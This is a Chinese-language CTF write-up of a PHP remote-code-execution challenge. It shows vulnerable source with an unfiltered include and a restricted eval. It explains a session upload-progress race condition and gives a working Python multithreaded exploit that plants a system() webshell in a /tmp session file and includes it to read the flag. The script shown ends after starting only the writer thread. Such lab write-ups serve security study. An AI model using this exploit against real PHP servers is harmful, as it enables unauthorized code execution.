题型:RCE
漏洞原因:include $_GET[‘file’];
&lt;?php
if(!isset($_GET[&#039;mode&#039;])){
    highlight_file(__file__);
}else if($_GET[&#039;mode&#039;] == &quot;eval&quot;){
    $shell = $_GET[&#039;shell&#039;] ?? &#039;phpinfo();&#039;;
    if(strlen($shell) &gt; 15 | filter($shell) | checkNums($shell)) exit(&quot;hacker&quot;);
    eval($shell);
}


if(isset($_GET[&#039;file&#039;])){
    if(strlen($_GET[&#039;file&#039;]) &gt; 15 | filter($_GET[&#039;file&#039;])) exit(&quot;hacker&quot;);
    include $_GET[&#039;file&#039;];
}


function filter($var): bool{
    $banned = [&quot;while&quot;, &quot;for&quot;, &quot;\$_&quot;, &quot;include&quot;, &quot;env&quot;, &quot;require&quot;, &quot;?&quot;, &quot;:&quot;, &quot;^&quot;, &quot;+&quot;, &quot;-&quot;, &quot;%&quot;, &quot;*&quot;, &quot;`&quot;];

    foreach($banned as $ban){
        if(strstr($var, $ban)) return True;
    }

    return False;
}

function checkNums($var): bool{
    $alphanum = &#039;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&#039;;
    $cnt = 0;
    for($i = 0; $i &lt; strlen($alphanum); $i++){
        for($j = 0; $j &lt; strlen($var); $j++){
            if($var[$j] == $alphanum[$i]){
                $cnt += 1;
                if($cnt &gt; 8) return True;
            }
        }
    }
    return False;
}
?&gt; 
应该是要使用不超过8个[abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ]内字符并且不包含[&quot;while&quot;, &quot;for&quot;, &quot;\$_&quot;, &quot;include&quot;, &quot;env&quot;, &quot;require&quot;, &quot;?&quot;, &quot;:&quot;, &quot;^&quot;, &quot;+&quot;, &quot;-&quot;, &quot;%&quot;, &quot;*&quot;, &quot;”]`且小于15个字符进行webshell
由于session的参数可以查看
session.upload_progress.enabled:上传文件时可以把文件上传的进度和信息存储在session中
session.upload_progress.cleanup:文件上传结束后,php会立即清空对应session中的内容
条件竞争漏洞:blog.csdn.net/qq_48904485/article/details/123642632




























session.save_path:可以看到session文件保存路径，一般在/tmp/下生成一个sess_xxxx的文件
session.use_strict_mode:关闭说明用户可以自定义sessionid 即session文件名为sess_sessionid
通过python多线程的方式 使php服务器环境未来得及删除session 修改临时文件内容 进行文件包含
import requests 
import threading
import io

myurl = &#039;challenge-9381c8253b67aee0.sandbox.ctfhub.com:10800/index.php&#039; 
sessid = &#039;2&#039;
myfile = io.BytesIO(b&#039;_(:3&#039; * 1024)#将指定字符串作为重复的字节序列初始化填充
writedata = {&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;:&quot;&lt;?php system(&#039;cat /flag_is_here_not_are_but_you_find&#039;) ?&gt;&quot;} #webshell
mycookie = {&#039;PHPSESSID&#039;: sessid}

def writeshell(session): 
    while True:
        resp = requests.post(url=myurl, data=writedata, files={&#039;file&#039;: (&#039;_(:3.txt&#039;, myfile)}, cookies=mycookie)

def getshell(session): 
    while True:
        payload_url = myurl + &#039;?file=&#039; + &#039;/tmp/sess_&#039; +sessid 
        resp = requests.get(url=payload_url)
        if &#039;upload_progress&#039; in resp.text: 
            print(resp.text)
            break
        else:
            pass

if __name__ == &#039;__main__&#039;: 
    session = requests.session()
    writeshell = threading.Thread(target=writeshell, args=(session,))#创建多线程 条件竞争？
    writeshell.daemon = True#守护线程 主线程结束 守护线程也会自动结束
    writeshell.start() 
